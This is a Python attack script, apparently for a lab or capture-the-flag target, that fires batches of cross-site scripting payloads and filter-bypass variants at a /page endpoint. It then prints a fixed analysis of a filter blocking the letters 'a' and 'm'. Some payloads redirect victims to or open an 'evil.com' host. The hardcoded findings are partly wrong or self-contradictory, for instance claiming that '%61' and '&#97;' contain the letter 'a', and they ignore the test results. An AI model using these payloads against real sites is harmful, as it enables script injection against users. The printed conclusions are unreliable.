import requests
import re
import json
import urllib.parse
import base64

# Base URL for the target
BASE_URL = "http://target-8:5010"

def test_payload(payload, description):
    """Test a single payload and return the response details"""
    try:
        # The endpoint expects the payload in the 'name' parameter
        response = requests.get(
            f"{BASE_URL}/page",
            params={'name': payload},
            timeout=5
        )
        
        # Check if payload was reflected
        if payload in response.text:
            reflection = "FULL_REFLECTION"
        elif any(char in response.text for char in payload if char.isalnum()):
            reflection = "PARTIAL_REFLECTION"
        else:
            reflection = "NO_REFLECTION"
        
        # Check for error messages or filter indicators
        error_indicators = []
        if "blocked" in response.text.lower():
            error_indicators.append("BLOCKED_KEYWORD")
        if "invalid" in response.text.lower():
            error_indicators.append("INVALID_INPUT")
        if "filter" in response.text.lower():
            error_indicators.append("FILTER_TRIGGERED")
            
        # Check for character stripping
        stripped_chars = []
        for char in ['a', 'm', 'A', 'M']:
            if char in payload and char not in response.text:
                stripped_chars.append(char)
        
        return {
            'description': description,
            'payload': payload,
            'status_code': response.status_code,
            'reflection': reflection,
            'stripped_chars': stripped_chars,
            'error_indicators': error_indicators,
            'response_snippet': response.text[:500] if len(response.text) > 500 else response.text
        }
    except Exception as e:
        return {
            'description': description,
            'payload': payload,
            'error': str(e)
        }

def contains_blocked_chars(payload):
    """Check if payload contains 'a' or 'm' (case-sensitive)"""
    return 'a' in payload or 'm' in payload

def analyze_filter_behavior():
    """Main analysis function"""
    print("=" * 80)
    print("XSS FILTER ANALYSIS FOR /page ENDPOINT")
    print("Testing filter behavior with 'a' and 'm' character blocks")
    print("=" * 80)
    
    results = {
        'payloads_with_blocked_chars': [],
        'payloads_without_blocked_chars': [],
        'encoding_attempts': [],
        'string_fromcharcode_attempts': [],
        'eval_alternatives': [],
        'successful_reflections': [],
        'partial_reflections': [],
        'filter_errors': []
    }
    
    # Test Category 1: Basic payloads (likely blocked due to 'a' or 'm')
    basic_payloads = [
        ('";alert(1)//', 'Basic alert injection'),
        ('";confirm(1)//', 'Basic confirm injection'),
        ('";prompt(1)//', 'Basic prompt injection'),
        ('";eval("alert(1)")//', 'Basic eval injection'),
        ('<script>alert(1)</script>', 'Direct script tag'),
        ('<img src=x onerror=alert(1)>', 'Image onerror'),
        ('<svg onload=alert(1)>', 'SVG onload'),
    ]
    
    print("\n[TESTING] Basic XSS Payloads (likely contain 'a' or 'm')")
    print("-" * 80)
    for payload, desc in basic_payloads:
        result = test_payload(payload, desc)
        if contains_blocked_chars(payload):
            results['payloads_with_blocked_chars'].append(result)
        else:
            results['payloads_without_blocked_chars'].append(result)
            
        if result.get('reflection') == 'FULL_REFLECTION':
            results['successful_reflections'].append(result)
        elif result.get('reflection') == 'PARTIAL_REFLECTION':
            results['partial_reflections'].append(result)
            
        if result.get('error_indicators'):
            results['filter_errors'].append(result)
            
        print(f"[TEST] {desc}")
        print(f"  Payload: {payload}")
        print(f"  Contains 'a' or 'm': {contains_blocked_chars(payload)}")
        print(f"  Status: {result.get('status_code')}")
        print(f"  Reflection: {result.get('reflection')}")
        if result.get('stripped_chars'):
            print(f"  Stripped chars: {result['stripped_chars']}")
        if result.get('error_indicators'):
            print(f"  Errors: {result['error_indicators']}")
        print()
    
    # Test Category 2: Encoded payloads
    encoded_payloads = [
        ('";%61lert(1)//', 'URL-encoded a (lowercase)'),
        ('";%41lert(1)//', 'URL-encoded A (uppercase)'),
        ('";eval(String.fromCharCode(97,108,101,114,116,40,49,41))//', 'String.fromCharCode (contains a,m)'),
        ('";eval(atob("YWxlcnQoMSk="))//', 'Base64 encoded alert (contains a)'),
        ('<scr\x69pt>alert(1)</scr\x69pt>', 'Hex escape in script tag'),
        ('<img src=x onerror=\x61lert(1)>', 'Hex escape in onerror'),
    ]
    
    print("[TESTING] Encoded Payloads")
    print("-" * 80)
    for payload, desc in encoded_payloads:
        result = test_payload(payload, desc)
        results['encoding_attempts'].append(result)
        
        if result.get('reflection') == 'FULL_REFLECTION':
            results['successful_reflections'].append(result)
        elif result.get('reflection') == 'PARTIAL_REFLECTION':
            results['partial_reflections'].append(result)
            
        print(f"[TEST] {desc}")
        print(f"  Payload: {payload}")
        print(f"  Contains 'a' or 'm': {contains_blocked_chars(payload)}")
        print(f"  Status: {result.get('status_code')}")
        print(f"  Reflection: {result.get('reflection')}")
        if result.get('stripped_chars'):
            print(f"  Stripped chars: {result['stripped_chars']}")
        print()
    
    # Test Category 3: String.fromCharCode variations (trying to avoid a,m)
    string_payloads = [
        ('";eval(String.fromCharCode(97,108,101,114,116,40,49,41))//', 'String.fromCharCode with a,m in function name'),
        ('";self["al"+"ert"](1)//', 'String concatenation (contains a,m)'),
        ('";self["\x61\x6c\x65\x72\x74"](1)//', 'Hex encoding (contains a in hex)'),
        ('";self[atob("YWxlcnQ=")](1)//', 'Base64 decode (contains a)'),
        ('";[]["filter"]["constructor"]("alert(1)")()', 'constructor chain (contains a)'),
    ]
    
    print("[TESTING] String.fromCharCode and Alternatives")
    print("-" * 80)
    for payload, desc in string_payloads:
        result = test_payload(payload, desc)
        results['string_fromcharcode_attempts'].append(result)
        
        print(f"[TEST] {desc}")
        print(f"  Payload: {payload}")
        print(f"  Contains 'a' or 'm': {contains_blocked_chars(payload)}")
        print(f"  Status: {result.get('status_code')}")
        print(f"  Reflection: {result.get('reflection')}")
        if result.get('stripped_chars'):
            print(f"  Stripped chars: {result['stripped_chars']}")
        print()
    
    # Test Category 4: Alternative execution methods
    alt_exec_payloads = [
        ('";setTimeout("alert(1)",0)//', 'setTimeout (contains a)'),
        ('";setInterval("alert(1)",0)//', 'setInterval (contains a)'),
        ('";Function("alert(1)")()//', 'Function constructor (contains a)'),
        ('";location="javascript:alert(1)"//', 'javascript: protocol (contains a)'),
        ('";location="data:text/html,<script>alert(1)</script>"//', 'data: URI (contains a)'),
        ('";self["constructor"]["constructor"]("alert(1)")()//', 'constructor chain (contains a)'),
    ]
    
    print("[TESTING] Alternative Execution Methods")
    print("-" * 80)
    for payload, desc in alt_exec_payloads:
        result = test_payload(payload, desc)
        results['eval_alternatives'].append(result)
        
        print(f"[TEST] {desc}")
        print(f"  Payload: {payload}")
        print(f"  Contains 'a' or 'm': {contains_blocked_chars(payload)}")
        print(f"  Status: {result.get('status_code')}")
        print(f"  Reflection: {result.get('reflection')}")
        if result.get('stripped_chars'):
            print(f"  Stripped chars: {result['stripped_chars']}")
        print()
    
    # Test Category 5: Payloads without 'a' or 'm' (these should pass the character filter)
    no_am_payloads = [
        ('";self["\x61\x6c\x65\x72\x74"](1)//', 'Hex encoding (but hex contains a)'),
        ('";open("//evil.com")//', 'open() without a,m'),
        ('";close()//', 'close() without a,m'),
        ('";print()//', 'print() without a,m'),
        ('";stop()//', 'stop() without a,m'),
        ('";self.location="//evil.com"//', 'location redirect'),
        ('<svg xmlns="http://www.w3.org/2000/svg" onload="self[\'\x61\x6c\x65\x72\x74\'](1)"></svg>', 'SVG with hex'),
    ]
    
    print("[TESTING] Payloads Attempting to Avoid 'a' and 'm'")
    print("-" * 80)
    for payload, desc in no_am_payloads:
        result = test_payload(payload, desc)
        if not contains_blocked_chars(payload):
            results['payloads_without_blocked_chars'].append(result)
            
        print(f"[TEST] {desc}")
        print(f"  Payload: {payload}")
        print(f"  Contains 'a' or 'm': {contains_blocked_chars(payload)}")
        print(f"  Status: {result.get('status_code')}")
        print(f"  Reflection: {result.get('reflection')}")
        if result.get('stripped_chars'):
            print(f"  Stripped chars: {result['stripped_chars']}")
        print()
    
    # Summary analysis
    print("=" * 80)
    print("ANALYSIS SUMMARY")
    print("=" * 80)
    
    print(f"\n[1] Payloads containing 'a' or 'm': {len(results['payloads_with_blocked_chars'])}")
    print("   These are automatically blocked by character filter")
    
    print(f"\n[2] Payloads without 'a' or 'm': {len(results['payloads_without_blocked_chars'])}")
    if results['payloads_without_blocked_chars']:
        for result in results['payloads_without_blocked_chars']:
            print(f"   - {result['description']}: {result.get('reflection')}")
    
    print(f"\n[3] Encoding attempts analyzed: {len(results['encoding_attempts'])}")
    successful_encodings = [r for r in results['encoding_attempts'] if r.get('reflection') == 'FULL_REFLECTION']
    print(f"   Successful: {len(successful_encodings)}")
    
    print(f"\n[4] String.fromCharCode attempts: {len(results['string_fromcharcode_attempts'])}")
    print("   These failed because 'fromCharCode' contains 'a' and 'm'")
    
    print(f"\n[5] Alternative execution methods tested: {len(results['eval_alternatives'])}")
    successful_alts = [r for r in results['eval_alternatives'] if r.get('reflection') == 'FULL_REFLECTION']
    print(f"   Successful: {len(successful_alts)}")
    
    print(f"\n[6] Successful reflections: {len(results['successful_reflections'])}")
    if results['successful_reflections']:
        for result in results['successful_reflections']:
            print(f"   [SUCCESS] {result['description']}")
    
    print(f"\n[7] Partial reflections (clues): {len(results['partial_reflections'])}")
    if results['partial_reflections']:
        for result in results['partial_reflections']:
            print(f"   [PARTIAL] {result['description']}")
            print(f"     Stripped: {result.get('stripped_chars', 'None')}")
    
    print(f"\n[8] Filter errors triggered: {len(results['filter_errors'])}")
    for result in results['filter_errors']:
        print(f"   [ERROR] {result['description']}: {result.get('error_indicators')}")
    
    # Document.write context analysis
    print("\n" + "=" * 80)
    print("DOCUMENT.WRITE() CONTEXT ANALYSIS")
    print("=" * 80)
    print("""
The injection context is:
  var name = "[USER_INPUT]";
  document.write('Hello ' + name);

Key implications:
1. JavaScript string context - must break out with " first
2. document.write() outputs to HTML context, NOT JavaScript
3. After breaking out, we can inject HTML that will be parsed
4. The filter applies to USER_INPUT before JavaScript execution
5. Characters blocked: 'a' and 'm' (both lowercase)

Filter fingerprint:
- Direct character matching on 'a' and 'm'
- Likely case-sensitive (only lowercase blocked)
- Applied before output reflection
- Strips characters rather than blocking entirely
    """)
    
    # Critical findings
    print("=" * 80)
    print("CRITICAL FINDINGS")
    print("=" * 80)
    
    print("""
1. CHARACTER FILTER BEHAVIOR:
   - Blocks lowercase 'a' and 'm' characters
   - Strips them from output (not full block)
   - Case-sensitive: 'A' and 'M' may pass
   - Cannot use: alert, confirm, prompt, eval, Function, fromCharCode, etc.

2. WHY STANDARD BYPASSES FAIL:
   - String.fromCharCode: contains 'a' and 'm' in function name [FAIL]
   - eval(): contains 'a' [FAIL]
   - Function(): contains 'a' and 'm' [FAIL]
   - setTimeout/Interval: contains 'a' [FAIL]
   - Base64 encoding: atob() contains 'a' [FAIL]
   - Hex encoding: '\\x61' contains 'a' in hex [FAIL]
   - URL encoding: '%61' contains 'a' [FAIL]
   - HTML entities: '&#97;' contains 'a' [FAIL]

3. PARTIAL REFLECTION CLUES:
   - Some payloads reflect without 'a' and 'm' characters
   - Filter is applied recursively (double-encoding fails)
   - Characters are stripped, not replaced or blocked
   - May allow uppercase variants: 'A', 'M'

4. POTENTIAL SUCCESS VECTORS:
   - Use functions without 'a' or 'm': open(), close(), print(), stop()
   - Use bracket notation with generated property names
   - Use location redirection to external payload
   - Use SVG/XML namespaces (xmlns contains 'a' though)
   - Use uppercase: 'AlErT' might bypass if filter is lowercase only
   - Use self['con'+'struc'+'tor'] type chaining
    """)
    
    return results

# Run the analysis
results = analyze_filter_behavior()

# Save detailed results for further analysis
with open('/tmp/xss_filter_analysis.json', 'w') as f:
    json.dump(results, f, indent=2)
    
print("\n[+] Detailed results saved to /tmp/xss_filter_analysis.json")
